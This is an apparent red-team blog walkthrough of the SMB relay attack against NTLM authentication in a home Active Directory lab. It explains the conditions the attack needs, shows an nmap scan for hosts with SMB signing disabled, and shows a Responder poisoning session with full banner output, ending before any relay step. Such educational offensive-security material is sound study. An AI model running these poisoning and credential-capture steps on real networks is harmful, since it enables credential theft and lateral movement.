---
title: SMB Relay Attack
date: 2022-10-29 12:00:00 +0100
categories: [Network Security, Active Directory, Initial Attack Vectors]
tags: [activedirectory, networksec, redteaming, offensivesec]     # TAG names should always be lowercase
math: true
mermaid: true
---
## What is SMB?
The Server Message Block (SMB) protocol provides access to data, printers, and ser‐
vice endpoints (via named pipes), At a high level, SMB communication is easy to understand. SMB clients connect to an SMB server using the SMB port to access SMB shares. Once they access the SMB shares, clients can do things such as collaborate on files without downloading them to their machines or print using a networked printer.

## What is SMB Relay Attack?
SMB Relay Attack is a type of attack which relies on NTLM v2 authentication that is normally used in most companies.

Unfortunately, when we are listening to what is going on in the network, we’re able to capture a certain part of the traffic related to the authentication (using Responder) and instead of cracking hashes gathered, we can instead relay those
hashes to specific machines and potentially
gain access

But successfully relay those hashes, two conditions must be satisfied :
<br />
1. SMB signing must be disabled on the target (it's a security mechanism in the SMB protocol)
2. Relayed user credentials must be admin
on machine
<br />

![Desktop View](/assets/img/smbrelay.png){: width="972" height="589" }
_SMB Relay Attack_

## Practical Attack Scenario
I didn't find any HTB lab that contains this type of attacks so I decided to rebuild the Active Directory Lab by TCM Academy.
<br />

1. Identifying hosts with SMB signing disabled with NMAP:
```bash
┌──(cowdex㉿kali)-[~]
└─$ nmap --script smb-security-mode.nse -Pn -p445 192.168.181.140
```
2. Running Responder on the Attacker Machine:
```bash
┌──(cowdex㉿kali)-[~]
└─$ esponder -I eth0 -d -w
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.3.0

  To support this project:
  Patreon -> https://www.patreon.com/PythonResponder
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [ON]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [ON]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [eth0]
    Responder IP               [192.168.181.128]
    Responder IPv6             [fe80::20c:29ff:fefd:7a6d]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']

[+] Current Session Variables:
    Responder Machine Name     [WIN-AGGZ030QBTK]
    Responder Domain Name      [C249.LOCAL]
    Responder DCE-RPC Port     [48698]

[+] Listening for events...                                                  

[*] [DHCP] Found DHCP server IP: 192.168.181.254, now waiting for incoming requests...

```